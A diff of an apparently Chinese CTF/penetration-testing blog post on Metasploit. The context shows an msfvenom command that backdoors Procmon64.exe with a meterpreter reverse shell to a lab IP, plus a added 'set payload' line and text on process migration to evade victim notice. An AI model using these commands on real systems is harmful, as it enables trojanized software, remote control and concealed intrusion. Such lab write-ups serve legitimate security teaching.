@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.1.png">
 <meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F4.2.png">
 <meta property="article:published_time" content="2024-09-05T10:47:34.194Z">
-<meta property="article:modified_time" content="2024-09-18T11:57:46.698Z">
+<meta property="article:modified_time" content="2024-09-22T08:38:43.551Z">
 <meta property="article:author" content="l1nk">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="msf">
@@ -234,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1k 字
+          1.1k 字
         
       </span>
     
@@ -294,6 +294,8 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#替换为自己的ip和端口</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp -x /opt/Procmon64.exe -k lhost=192.168.56.132 lport=1689 -f exe &gt; /opt/procmon.exe<br></code></pre></td></tr></table></figure>
 <p><img src="/img/%E6%B8%97%E9%80%8F4.3.png" srcset="/img/loading.gif" lazyload alt="图片" title="生成了带后门的procmon软件"></p>
 <p>修改配置项，用我们生成的带后门的procmon软件进行攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="hljs-comment">#设置payload</span><br></code></pre></td></tr></table></figure>
+
 <p><img src="/img/%E6%B8%97%E9%80%8F4.4.png" srcset="/img/loading.gif" lazyload alt="图片" title="配置改为1689端口，成功拿到shell"></p>
 <p>如果希望对方在关闭软件后，会话依然可以保留，就需要在建立会话之后，迅速进行进程迁移</p>
 <p>进程迁移是指为了不被受害者发现自己被攻击了从而把攻击进程伪装起来，通常是把shell进程藏在别的正常的进程中让人不易察觉。</p>
